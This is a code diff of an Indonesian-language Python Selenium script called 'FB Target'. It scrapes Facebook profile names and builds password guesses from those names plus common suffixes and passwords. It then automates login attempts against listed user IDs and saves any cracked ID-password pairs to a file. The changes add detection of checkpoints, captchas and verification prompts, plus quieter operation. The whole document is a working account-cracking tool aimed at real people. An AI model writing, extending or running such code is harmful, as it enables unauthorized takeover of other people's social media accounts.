@@ -13,8 +13,7 @@ from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException
-
+from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException, WebDriverException
 init(autoreset=True)
 
 TARGET_FILE_PATH = "targets.txt"
@@ -28,19 +27,15 @@ KEYWORDS = [
     "123", "12345", "321", "sayang", "ganteng", "cantik",
 ]
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.114 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
 ]
 def hapus_profil_chrome(path):
     if os.path.exists(path):
         try:
             shutil.rmtree(path)
-            print(Fore.YELLOW + f"[INFO] Profil sementara di '{path}' berhasil dihapus.") # BISA DIBUAT SILENT
-        except Exception as e:
-            print(Fore.RED + f"[ERROR] Gagal menghapus profil di '{path}': {e}")
-
+        except Exception:
+            pass
 def inisialisasi_browser(profile_path):
     print(Fore.CYAN + "[INFO] Menginisialisasi browser...")
     options = Options()
@@ -56,8 +51,9 @@ def inisialisasi_browser(profile_path):
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     
     # --- PENGATURAN HEADLESS ---
-    #options.add_argument("--headless") #HAPUS TANDA PAGAR DI DEPANNYA UNTUK MODE HEADLESS
-    #options.add_argument("--disable-gpu") #HAPUS TANDA PAGAR DI DEPANNYA UNTUK MODE HEADLESS
+    # Hapus tanda '#' untuk menyembunyikan browser
+    #options.add_argument("--headless")
+    #options.add_argument("--disable-gpu")
     
     try:
         service = Service(
@@ -68,11 +64,25 @@ def inisialisasi_browser(profile_path):
             stderr=subprocess.DEVNULL
         )
         driver = webdriver.Chrome(service=service, options=options)
-        print(Fore.GREEN + "[INFO] Browser berhasil dibuat (Mode Headless Silent).") #BISA DIBUAT SILENT CUKUP TAMBAHKAN PAGAR DI DEPANNYA
+        print(Fore.GREEN + "[INFO] Browser berhasil dibuat.")
         return driver
     except Exception as e:
         print(Fore.RED + f"[ERROR] Gagal menginisialisasi browser: {e}")
         return None
+def check_login_status(driver):
+    current_url = driver.current_url.lower()
+    page_source = driver.page_source.lower()
+    if "checkpoint" in current_url:
+        return "CHECKPOINT"
+    if "grecaptcha" in page_source or "captcha" in page_source:
+        return "RECAPTCHA"
+    if "masukkan kode" in page_source or "konfirmasi identitas" in page_source:
+        return "VERIFICATION_CODE"
+    if "login" not in current_url and "facebook.com" in current_url:
+        return "SUCCESS"
+    if "kata sandi yang anda masukkan salah" in page_source or "password that you've entered is incorrect" in page_source:
+        return "WRONG_PASSWORD"
+    return "UNKNOWN"
 def get_profile_name(driver, profile_url):
     print(Fore.CYAN + f"[INFO] Mengambil nama dari: {profile_url}")
     try:
@@ -83,9 +93,7 @@ def get_profile_name(driver, profile_url):
         raw_name_text = name_element.text
         if raw_name_text:
             cleaned_name = re.sub(r'[^a-zA-Z\s]', '', raw_name_text).strip()
-            if not cleaned_name:
-                print(Fore.YELLOW + "[WARN] Nama profil menjadi kosong setelah dibersihkan, target dilewati.")
-                return None
+            if not cleaned_name: return None
             print(Fore.GREEN + f"[INFO] Nama profil ditemukan: {cleaned_name}")
             return cleaned_name
         return None
@@ -97,29 +105,25 @@ def generate_passwords(first_name, last_name):
     fn_lower = first_name.lower().split()[0]
     ln_lower = last_name.lower().split()[-1]
     name_variations = {fn_lower}
-    if fn_lower != ln_lower:
-        name_variations.add(ln_lower)
+    if fn_lower != ln_lower: name_variations.add(ln_lower)
     for name in name_variations:
         if not name: continue
-        for keyword in KEYWORDS:
-            passwords_generated.add(name + keyword)
+        for keyword in KEYWORDS: passwords_generated.add(name + keyword)
     passwords_generated.add(fn_lower)
     if fn_lower != ln_lower:
         passwords_generated.add(ln_lower)
         passwords_generated.add(fn_lower + ln_lower)
-    for common_pw in COMMON_PASSWORDS:
-        passwords_generated.add(common_pw)
+    for common_pw in COMMON_PASSWORDS: passwords_generated.add(common_pw)
     final_list = list(passwords_generated)
     print(Fore.BLUE + f"[INFO] Dibuat total {len(final_list)} kombinasi password.")
     return final_list
 def attempt_login_for_target(driver, uid, passwords):
     print(Fore.CYAN + f"[INFO] Memulai percobaan login untuk UID: {uid}...")
     driver.get(FACEBOOK_LOGIN_URL)
-    time.sleep(1)
+    time.sleep(2)
     for i, password in enumerate(passwords, 1):
         try:
-            if i % 5 == 0 or i == 1 or i == len(passwords):
-                 print(Fore.WHITE + f"  -> Mencoba password #{i} dari {len(passwords)}...", end="\r")
+            print(Fore.WHITE + f"  -> Mencoba password #{i}/{len(passwords)}: {'*' * len(password)}", end="\r")
             wait = WebDriverWait(driver, 10)
             email_field = wait.until(EC.visibility_of_element_located((By.ID, "email")))
             pass_field = wait.until(EC.visibility_of_element_located((By.ID, "pass")))
@@ -133,25 +137,26 @@ def attempt_login_for_target(driver, uid, passwords):
                 time.sleep(random.uniform(0.05, 0.15))
             login_button = wait.until(EC.element_to_be_clickable((By.NAME, "login")))
             login_button.click()
-            time.sleep(4)
-            current_url = driver.current_url.lower()
-            if "checkpoint" in current_url or "captcha" in current_url:
-                print(Fore.RED + "\n[STATUS] Checkpoint/Captcha terdeteksi. Menghentikan target ini.")
-                return "DETECTED", None
-            if "login" not in current_url and "facebook.com" in current_url:
-                print(Fore.GREEN + Style.BRIGHT + "\n[STATUS] BERHASIL!                                  ")
+            time.sleep(5) 
+            status = check_login_status(driver)
+            if status == "SUCCESS":
+                print(Fore.GREEN + Style.BRIGHT + "\n[STATUS] ✅ BERHASIL! Login sukses tanpa verifikasi.")
                 return "SUCCESS", password
-            page_source = driver.page_source.lower()
-            if "kata sandi yang anda masukkan salah" in page_source or "password that you've entered is incorrect" in page_source:
+            elif status == "WRONG_PASSWORD" or status == "UNKNOWN":
                 continue
+            else: 
+                if status == "CHECKPOINT": print(Fore.RED + "\n[STATUS] 🔐 CHECKPOINT! Akun terkunci sementara.")
+                elif status == "RECAPTCHA": print(Fore.RED + "\n[STATUS] 🔒 CAPTCHA! Facebook meminta verifikasi bot.")
+                elif status == "VERIFICATION_CODE": print(Fore.YELLOW + "\n[STATUS] 🔐 VERIFIKASI! Butuh kode login.")
+                return "DETECTED", None 
         except (StaleElementReferenceException, TimeoutException):
             continue
-    print(Fore.YELLOW + "\n[STATUS] GAGAL. Semua kombinasi password telah dicoba.")
+    print(Fore.YELLOW + "\n[STATUS] ❌ GAGAL! Semua kombinasi password telah dicoba.")
     return "FAIL", None
 def main():
     banner = pyfiglet.figlet_format("FB Target", font="slant")
     print(Fore.MAGENTA + banner)
-    print(Fore.MAGENTA + "Silent Version | by Partner Coding".center(60))
+    print(Fore.MAGENTA + "  ".center(60)) #BISA DI ISI NAMA 
     print(Fore.MAGENTA + "="*60)
     if not os.path.exists(TARGET_FILE_PATH):
         print(Fore.RED + f"[ERROR] File '{TARGET_FILE_PATH}' tidak ditemukan!")
@@ -161,44 +166,48 @@ def main():
     if not targets:
         print(Fore.RED + f"[ERROR] File '{TARGET_FILE_PATH}' kosong.")
         return
-    for i, target_line in enumerate(targets, 1):
-        print(Fore.WHITE + Style.BRIGHT + f"\n--- Memproses Target #{i} dari {len(targets)}: {target_line} ---")
-        driver = None
-        try:
+    try:
+        for i, target_line in enumerate(targets, 1):
+            print(Fore.WHITE + Style.BRIGHT + f"\n--- Memproses Target #{i} dari {len(targets)}: {target_line} ---")
+            driver = None
             hapus_profil_chrome(CHROME_PROFILE_TEMP_PATH)
-            driver = inisialisasi_browser(CHROME_PROFILE_TEMP_PATH)
-            if not driver:
-                print(Fore.RED + "[ERROR] Browser gagal dibuat, lanjut ke target berikutnya.")
-                continue
             try:
-                profile_link, uid = target_line.split('|')
-            except ValueError:
-                print(Fore.YELLOW + f"[WARN] Format baris salah, dilewati: '{target_line}' (Harus: link|uid)")
-                continue
-            name = get_profile_name(driver, profile_link.strip())
-            if not name:
-                print(Fore.YELLOW + "[WARN] Tidak bisa mendapatkan nama, target ini dilewati.")
-                continue
-            name_parts = name.strip().split()
-            first_name = name_parts[0]
-            last_name = name_parts[-1] if len(name_parts) > 1 else first_name
-            passwords_to_try = generate_passwords(first_name, last_name)
-            status, found_password = attempt_login_for_target(driver, uid.strip(), passwords_to_try)
-            if status == "SUCCESS":
-                print(Fore.GREEN + Style.BRIGHT + f"[DITEMUKAN] UID: {uid} | Password: {found_password}")
-                with open(SUCCESS_FILE_PATH, 'a', encoding='utf-8') as f:
-                    f.write(f"{uid}|{found_password}\n")
-                print(Fore.GREEN + f"[INFO] Akun berhasil disimpan ke '{SUCCESS_FILE_PATH}'.")
-        finally:
-            if driver:
-                driver.quit()
-            hapus_profil_chrome(CHROME_PROFILE_TEMP_PATH)
-            print(Fore.MAGENTA + "-" * 60) # bisa di silent cukup tambahkan pagar depannya
-            time.sleep(3)
-
-    print(Fore.CYAN + "\n" + "="*60)
-    print(Fore.CYAN + "✅ SEMUA TARGET SELESAI DIPROSES".center(60))
-    print(Fore.CYAN + "="*60)
+                driver = inisialisasi_browser(CHROME_PROFILE_TEMP_PATH)
+                if not driver:
+                    print(Fore.RED + "[ERROR] Browser gagal dibuat, lanjut.")
+                    continue
+                try:
+                    profile_link, uid = target_line.split('|')
+                except ValueError:
+                    print(Fore.YELLOW + f"[WARN] Format baris salah: '{target_line}'")
+                    continue
+                name = get_profile_name(driver, profile_link.strip())
+                if not name:
+                    print(Fore.YELLOW + "[WARN] Gagal mendapatkan nama, target dilewati.")
+                    continue
+                name_parts = name.strip().split()
+                first_name = name_parts[0]
+                last_name = name_parts[-1] if len(name_parts) > 1 else first_name
+                passwords_to_try = generate_passwords(first_name, last_name)
+                status, found_password = attempt_login_for_target(driver, uid.strip(), passwords_to_try)
+                if status == "SUCCESS":
+                    print(Fore.GREEN + Style.BRIGHT + f"[DITEMUKAN] UID: {uid} | Password: {found_password}")
+                    with open(SUCCESS_FILE_PATH, 'a', encoding='utf-8') as f:
+                        f.write(f"{uid}|{found_password}\n")
+                    print(Fore.GREEN + f"[INFO] Akun berhasil disimpan ke '{SUCCESS_FILE_PATH}'.")
+            except WebDriverException:
+                print(Fore.YELLOW + "\n👋 Browser ditutup paksa. Lanjut ke target berikutnya...")
+            except KeyboardInterrupt:
+                print("\n🛑 Proses dihentikan oleh pengguna.")
+                break
+            finally:
+                if driver:
+                    driver.quit()
+    finally:
+        print(Fore.CYAN + "\n" + "="*60)
+        print(Fore.CYAN + "Membersihkan sisa proses...")
+        hapus_profil_chrome(CHROME_PROFILE_TEMP_PATH)
+        print(Fore.CYAN + "✅ SEMUA PROSES SELESAI DAN BERSIH.".center(60))
+        print(Fore.CYAN + "="*60)
 if __name__ == "__main__":
-
     main()
